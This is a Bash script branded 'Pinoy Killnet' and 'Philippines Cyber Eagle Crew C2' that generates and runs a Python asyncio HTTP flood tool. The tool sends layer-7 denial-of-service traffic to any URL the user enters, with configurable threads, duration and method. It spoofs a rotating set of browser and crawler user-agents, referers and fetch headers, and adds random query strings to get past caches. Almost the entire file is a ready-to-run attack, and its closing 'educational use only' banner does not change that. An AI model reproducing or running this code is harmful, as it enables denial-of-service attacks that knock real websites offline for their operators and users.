#!/bin/bash
# killnet_pinoy.sh - Pinoy Killnet Style L7 DDoS
# Jalankan: bash killnet_pinoy.sh

#!/bin/bash
# ph_eagle_simple.sh

clear

R='\033[0;31m'
G='\033[0;32m'
Y='\033[1;33m'
B='\033[0;34m'
C='\033[0;36m'
W='\033[1;37m'
N='\033[0m'

echo -e "${R}"

echo -e "${Y}"
echo "    ╔════════════════════════════════════════════════╗"
echo "    ║   🦅 PHILIPPINES CYBER EAGLE CREW C2 v4 🦅     ║"
echo "    ║   🇵🇭  FAST REQUEST | LAYER7 | BOTNET 🇵🇭        ║"
echo "    ║   👨‍💻  DEVELOPER: GHOSTBYTE443 👨‍💻           ║"
echo "    ╚════════════════════════════════════════════════╝"
echo -e "${N}"
echo -e "${N}"
echo ""

# Loading animation
echo -e "${Y}[*] LOADING ATTACK MODULE...${N}"
for i in {1..20}; do
    echo -ne "${R}█${N}"
    sleep 0.05
done
echo -e " ${G}100%${N}"
echo ""

# Input target
echo -e "${C}════════════════════════════════════════════════════════${N}"
echo -e "${W}[?] Target URL:${N}"
read -p "➤ " TARGET

echo -e "${W}[?] Concurrent Threads (100-2000):${N}"
read -p "➤ " THREADS

echo -e "${W}[?] Attack Duration (seconds):${N}"
read -p "➤ " DURATION

echo -e "${W}[?] Request Method [GET/POST/RANDOM]:${N}"
read -p "➤ " METHOD

echo -e "${C}════════════════════════════════════════════════════════${N}"
echo ""

# Attack animation
echo -e "${R}════════════════════════════════════════════════════════${N}"
echo -e "${Y}🔥 KILLNET PHILIPPINES ACTIVATED 🔥${N}"
echo -e "${B}🇵🇭 TARGET: ${W}$TARGET${N}"
echo -e "${B}🐺 THREADS: ${W}$THREADS${N}"
echo -e "${B}⏱️ DURATION: ${W}$DURATION sec${N}"
echo -e "${B}🎯 METHOD: ${W}$METHOD${N}"
echo -e "${R}════════════════════════════════════════════════════════${N}"
echo ""

# Create Python attack engine
cat > /data/data/com.termux/files/home/killnet_l7.py << 'PYEOF'
#!/usr/bin/env python3
import asyncio
import aiohttp
import random
import sys
import time
import ssl
import hashlib
from datetime import datetime

target = sys.argv[1]
threads = int(sys.argv[2])
duration = int(sys.argv[3])
method = sys.argv[4].upper()

# ============ GOOD USER-AGENT LIST (PINOY KILLNET STYLE) ============
USER_AGENTS = [
    # Windows 10/11
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 OPR/105.0.0.0",
    # Android
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.210 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.210 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.210 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.36",
    # iOS
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    # MacOS
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    # Linux
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0",
    # Bot/Crawler
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
    "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)",
    # Gaming consoles
    "Mozilla/5.0 (PlayStation 4 5.55) AppleWebKit/601.2 (KHTML, like Gecko)",
    "Mozilla/5.0 (Xbox One; CP ver) AppleWebKit/537.36 (KHTML, like Gecko) Edge/44.18362.3871"
]

# ============ REFERERS ============
REFERERS = [
    "https://www.google.com/",
    "https://www.facebook.com/",
    "https://www.youtube.com/",
    "https://www.bing.com/",
    "https://www.yahoo.com/",
    "https://www.tiktok.com/",
    "https://twitter.com/",
    "https://www.instagram.com/",
    "https://www.reddit.com/",
    "https://github.com/"
]

# ============ ACCEPT HEADERS ============
ACCEPT = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "application/json, text/plain, */*"
]

# ============ ACCEPT ENCODING ============
ACCEPT_ENCODING = [
    "gzip, deflate, br",
    "gzip, deflate",
    "gzip, br",
    "deflate, br"
]

# ============ ACCEPT LANGUAGE ============
ACCEPT_LANGUAGE = [
    "en-US,en;q=0.9",
    "en-US,en;q=0.9,fil;q=0.8",
    "fil-PH,fil;q=0.9,en;q=0.8",
    "id-ID,id;q=0.9,en;q=0.8"
]

class KillnetL7:
    def __init__(self):
        self.request_count = 0
        self.error_count = 0
        self.start_time = 0
        self.running = True
        
    def get_headers(self):
        """Generate random headers like real browser"""
        return {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": random.choice(ACCEPT),
            "Accept-Encoding": random.choice(ACCEPT_ENCODING),
            "Accept-Language": random.choice(ACCEPT_LANGUAGE),
            "Referer": random.choice(REFERERS),
            "Cache-Control": random.choice(["no-cache", "max-age=0", "no-store"]),
            "Connection": random.choice(["keep-alive", "close"]),
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": random.choice(["document", "empty", "script"]),
            "Sec-Fetch-Mode": random.choice(["navigate", "cors", "no-cors"]),
            "Sec-Fetch-Site": random.choice(["none", "same-origin", "cross-site"]),
            "Sec-Ch-Ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            "Sec-Ch-Ua-Mobile": random.choice(["?0", "?1"]),
            "Sec-Ch-Ua-Platform": random.choice(['"Windows"', '"Android"', '"iOS"', '"Linux"'])
        }
    
    def random_payload(self):
        """Generate random query parameters to bypass cache"""
        return {
            f"p{random.randint(1,9999)}": hashlib.md5(str(time.time_ns()).encode()).hexdigest()[:random.randint(8,16)],
            "t": int(time.time()),
            "r": random.random(),
            "v": random.randint(100000, 999999)
        }
    
    async def http_request(self, session, target):
        try:
            headers = self.get_headers()
            
            if method == "GET":
                # Add random query params
                params = self.random_payload()
                async with session.get(target, headers=headers, params=params, timeout=aiohttp.ClientTimeout(total=3)) as resp:
                    self.request_count += 1
                    
            elif method == "POST":
                data = self.random_payload()
                async with session.post(target, headers=headers, data=data, timeout=aiohttp.ClientTimeout(total=3)) as resp:
                    self.request_count += 1
                    
            else:  # RANDOM
                if random.random() > 0.5:
                    params = self.random_payload()
                    async with session.get(target, headers=headers, params=params, timeout=aiohttp.ClientTimeout(total=3)) as resp:
                        self.request_count += 1
                else:
                    data = self.random_payload()
                    async with session.post(target, headers=headers, data=data, timeout=aiohttp.ClientTimeout(total=3)) as resp:
                        self.request_count += 1
                        
        except Exception as e:
            self.error_count += 1
    
    async def flood_worker(self, target):
        connector = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300, force_close=True)
        async with aiohttp.ClientSession(connector=connector) as session:
            while self.running:
                await self.http_request(session, target)
                await asyncio.sleep(0)  # Minimal delay for max speed
    
    async def monitor(self):
        last_count = 0
        last_time = time.time()
        
        while self.running:
            await asyncio.sleep(1)
            current_time = time.time()
            elapsed = current_time - last_time
            requests_done = self.request_count - last_count
            rps = requests_done / elapsed if elapsed > 0 else 0
            
            # Progress bar style
            bar_length = 30
            progress = min(1.0, (current_time - self.start_time) / duration)
            filled = int(bar_length * progress)
            bar = "█" * filled + "░" * (bar_length - filled)
            
            sys.stdout.write(f"\r\033[92m[{bar}]\033[0m \033[93mRPS:\033[0m \033[96m{rps:.0f}\033[0m | \033[93mTotal:\033[0m \033[96m{self.request_count}\033[0m | \033[93mErrors:\033[0m \033[91m{self.error_count}\033[0m   ")
            sys.stdout.flush()
            
            last_count = self.request_count
            last_time = current_time
            
            if current_time - self.start_time >= duration:
                self.running = False
    
    async def run(self, target):
        self.start_time = time.time()
        
        # Create worker tasks
        tasks = []
        for _ in range(threads):
            tasks.append(asyncio.create_task(self.flood_worker(target)))
        
        # Monitor task
        monitor_task = asyncio.create_task(self.monitor())
        
        # Wait for completion
        await monitor_task
        
        # Cancel all workers
        for task in tasks:
            task.cancel()
        
        await asyncio.gather(*tasks, return_exceptions=True)
        
        # Final stats
        elapsed = time.time() - self.start_time
        print("\n")
        print("=" * 60)
        print(f"\033[92m[✓] ATTACK COMPLETED!\033[0m")
        print(f"\033[93m    Total Requests: \033[96m{self.request_count}\033[0m")
        print(f"\033[93m    Total Errors: \033[91m{self.error_count}\033[0m")
        print(f"\033[93m    Duration: \033[96m{elapsed:.2f}s\033[0m")
        print(f"\033[93m    Average RPS: \033[96m{self.request_count/elapsed:.0f}\033[0m")
        print(f"\033[93m    Success Rate: \033[96m{(1 - self.error_count/self.request_count)*100:.1f}%\033[0m")
        print("=" * 60)

if __name__ == "__main__":
    print(f"\033[92m[+] KILLNET L7 ENGINE STARTED\033[0m")
    print(f"\033[93m[+] Target: {target}\033[0m")
    print(f"\033[93m[+] Threads: {threads}\033[0m")
    print(f"\033[93m[+] Duration: {duration}s\033[0m")
    print(f"\033[93m[+] Method: {method}\033[0m")
    print("")
    
    engine = KillnetL7()
    asyncio.run(engine.run(target))
PYEOF

# Install dependencies
echo -e "${Y}[*] Installing dependencies...${N}"
pip install aiohttp uvloop &>/dev/null
echo -e "${G}[✓] Dependencies ready${N}"
echo ""

# Run attack with loading animation
echo -e "${R}════════════════════════════════════════════════════════${N}"
echo -e "${Y}[🔥] PHILIPPINES CYBER EAGLE CREW ATTACK INITIATED [🔥]${N}"
echo -e "${R}════════════════════════════════════════════════════════${N}"
echo ""

# Show loading stock animation
for i in {1..30}; do
    echo -ne "${R}█${N}"
    sleep 0.03
done
echo ""

# Execute python engine
python /data/data/com.termux/files/home/killnet_l7.py "$TARGET" "$THREADS" "$DURATION" "$METHOD"

echo ""
echo -e "${C}════════════════════════════════════════════════════════${N}"
echo -e "${G}[✓] PHILIPPINES CYBER EAGLE CREW  ATTACK FINISHED!${N}"
echo -e "${B}🇵🇭 THANK YOU FOR USING PINOY KILLNET TOOLS 🇵🇭${N}"
echo -e "${R}⚠️ REMEMBER: FOR EDUCATIONAL USE ONLY IN LAB ENVIRONMENT ⚠️${N}"
echo -e "${C}════════════════════════════════════════════════════════${N}"